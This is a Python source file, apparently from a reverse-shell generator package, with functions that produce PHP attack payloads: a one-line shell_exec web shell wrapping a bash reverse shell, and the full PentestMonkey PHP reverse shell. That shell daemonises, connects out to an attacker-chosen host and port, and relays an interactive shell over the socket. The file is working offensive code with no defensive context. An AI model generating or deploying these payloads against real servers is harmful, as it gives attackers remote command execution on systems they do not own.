__all__ = ['reverse_bash', 'pentestmonkey']

from revshell.cmd.unix import reverse_bash as bash_cmd
from revshell.util import kwdefaults_from


@kwdefaults_from(bash_cmd)
def reverse_bash(lhost: str, lport: int, **kwargs) -> str:
    from revshell.php import php_adapter

    return php_adapter(
        "<pre><?= shell_exec({!p}) ?></pre>", bash_cmd(lhost, lport, **kwargs)
    )

def pentestmonkey(
    lhost: str,
    lport: int,
    *,
    shell_cmd="uname -a; w; id; sh -i",
    debug=False,
) -> str:
    """PHP reverse shell implementation from PentestMonkey

    References:
        https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
    """
    from revshell.php import php_escape

    shell_cmd = shell_cmd or "/bin/sh"
    debug = int(debug)
    args = {
        k: php_escape(v)
        for k, v in vars().items()
        if k in {"lhost", "lport", "shell_cmd", "debug"}
    }
    script = r"""<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = %(lhost)s;
$port = %(lport)s;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = %(shell_cmd)s;
$daemon = 0;
$debug = %(debug)s;
if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }
    if ($pid) {
        exit(0);
    }
    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }
    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}
$descriptorspec = array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("pipe", "w")
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }
    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if (in_array($sock, $read_a)) {
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }
    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }
    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {
    if (!$daemon) {
        print "$string\n";
    }
}
?>"""
    return script % args
